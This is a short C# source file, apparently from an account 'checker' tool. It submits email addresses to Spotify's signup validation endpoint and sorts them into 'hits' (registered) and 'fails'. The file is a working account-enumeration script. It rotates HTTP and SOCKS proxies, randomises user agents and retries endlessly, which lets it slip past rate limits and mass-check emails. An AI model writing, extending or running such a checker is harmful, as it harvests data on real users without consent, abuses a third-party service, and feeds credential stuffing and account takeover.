using System;
using Leaf.xNet;
using CheckerSimplefied;
using System.Drawing;

namespace SC___Mail_Validator
{
    class SpotifyVM
    {
        public static void getRequests(string username)
        {
            Utilities.name = "Spotify";
            for (; ; )
            {
                try
                {
                    if (Program.proxyType > 0)
                    {
                        Program.proxies = Program.PROXIES[new Random().Next(Program.PROXIES.Count)];
                    }
                    using (HttpRequest request = new HttpRequest())
                    {
                        switch ((int)((uint)Program.proxyType + ~(uint)1 + (uint)1))
                        {
                            case 0:
                                request.Proxy = HttpProxyClient.Parse(Program.proxies);
                                break;
                            case 1:
                                request.Proxy = Socks4ProxyClient.Parse(Program.proxies);
                                break;
                            case 2:
                                request.Proxy = Socks5ProxyClient.Parse(Program.proxies);
                                break;
                        }
                        request.KeepAlive = true;
                        request.ConnectTimeout = 2500;
                        request.IgnoreProtocolErrors = true;
                        AmelioratedWrapper.AddHeaderWithStyle(request, "User-Agent: " + Http.RandomUserAgent());
                        AmelioratedWrapper.AddHeaderWithStyle(request, "Content-Type: application/x-www-form-urlencoded");
                        string url = "https://spclient.wg.spotify.com/signup/public/v1/account?validate=1&email=" + username;
                        var response = request.Raw(HttpMethod.GET, url).ToString();

                        if (response.Contains("status\":20"))
                        {
                            Utilities.saveHits(username);
                            break;
                        }
                        if (response.Contains("status\":130") || response.Contains("status\":1"))
                        {
                            Utilities.saveFail(username);
                            break;
                        }
                    }
                }
                catch (Exception)
                {
                    Utilities.catchRetry();
                }
            }
        }
    }
}
